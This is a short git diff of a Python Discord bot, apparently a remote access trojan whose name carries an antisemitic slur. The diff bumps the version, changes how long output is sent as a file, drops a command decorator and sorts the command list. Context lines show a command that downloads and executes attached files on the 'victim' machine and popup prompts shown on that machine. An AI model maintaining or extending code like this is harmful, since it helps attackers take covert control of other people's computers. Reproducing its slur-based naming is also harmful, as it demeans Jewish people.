@@ -42,7 +42,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.3.3" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.3.4" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -55,10 +55,10 @@ pyautogui.FAILSAFE = False
 async def fm_send(ctx, content: str, alt_content: str = None, filename: str = "output.txt"):
     if len(content) > 2000:
         if alt_content is not None:
-            await ctx.send(content=alt_content)
+            buffer = io.BytesIO(alt_content.encode("utf-8"))
         else:
             buffer = io.BytesIO(content.encode("utf-8"))
-            await ctx.send(file=discord.File(fp=buffer, filename=filename))
+        await ctx.send(file=discord.File(fp=buffer, filename=filename))
     else:
         await ctx.send(content)
 
@@ -82,8 +82,7 @@ async def update(ctx):
         await ctx.send(f"Updater `{attachment.filename}` has been downloaded and executed.")
     except Exception as e:
         await ctx.send(f"Could not process the update. {str(e)}", empherial=True)
-
-@bot.command(help="Shows a popup on victim's machine and replies with the entered text using pymsgbox. (Window does not auto focus)")
+        
 async def prompt(ctx, *, question_and_default: str = ""):
     await ctx.send("✅ Prompt sent to victim. Waiting for input...")
     
@@ -1753,6 +1752,7 @@ per_page = 10
 @bot.command()
 async def commands(ctx, page: int = 1):
     commands_list = list(bot.commands)
+    commands_list.sort(key=lambda cmd: cmd.name)
 
     max_page = (len(commands_list) - 1) // per_page + 1
 
